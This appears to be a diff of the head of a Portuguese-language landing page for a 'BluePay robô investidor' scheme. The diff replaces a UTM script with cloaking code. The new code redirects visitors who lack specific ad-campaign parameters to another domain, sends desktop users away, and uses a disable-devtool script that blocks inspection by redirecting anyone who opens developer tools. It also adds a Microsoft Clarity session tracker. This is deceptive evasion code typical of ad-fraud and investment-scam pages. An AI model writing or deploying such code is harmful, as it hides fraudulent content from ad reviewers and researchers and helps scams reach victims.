@@ -1,22 +1,54 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
 
-	<script>
-		// Script coringa para preservar UTMs em qualquer botão <a>
-		document.addEventListener("DOMContentLoaded", function () {
-		  // Obtém a query string completa da URL atual
-		  const queryParams = window.location.search;
-		  
-		  // Seleciona todos os links com a classe 'elementor-button-link'
-		  document.querySelectorAll('a.elementor-button-link').forEach(button => {
-			// Atualiza o href de cada link, preservando as UTMs
-			if (queryParams) {
-			  const currentUrl = button.getAttribute('href');
-			  const separator = currentUrl.includes('?') ? '&' : '?';
-			  button.href = currentUrl + separator + queryParams.slice(1);
+<script type="text/javascript">
+		(function () {
+			/**
+			 * Função para verificar a presença de múltiplos parâmetros na URL
+			 * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+			 * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+			 */
+			function hasAllURLParameters(names) {
+				const urlParams = new URLSearchParams(window.location.search);
+				return names.every(param => urlParams.has(param));
 			}
-		  });
-		});
-		</script>	
+	
+			// Array contendo os parâmetros obrigatórios
+			const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+	
+			// URL para redirecionamento caso algum dos parâmetros não esteja presente
+			const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+	
+			/**
+			 * Função principal que verifica os parâmetros da URL
+			 * e redireciona o usuário se necessário
+			 */
+			function checkURLParameters() {
+				if (!hasAllURLParameters(requiredParams)) {
+					window.location.href = redirectURL;
+				}
+			}
+	
+			// Executa a verificação imediatamente assim que o script é carregado
+			checkURLParameters();
+		})();
+	</script>
+	
+	<script type="text/javascript">
+		(function (c, l, a, r, i, t, y) {
+			c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+			t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+			y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+		})(window, document, "clarity", "script", "qekndxg43i");
+	</script>
+	
+	<script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+		url="https://appavaliadorpremios.shop/lp/"></script>
+	
+	<script type="text/javascript">
+		if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+			window.location.href = 'https://appavaliadorpremios.shop/lp/';
+		}
+	</script>
 		
 	<meta charset="UTF-8">
 			<title>Segurança  BluePay  Robô investidor</title>
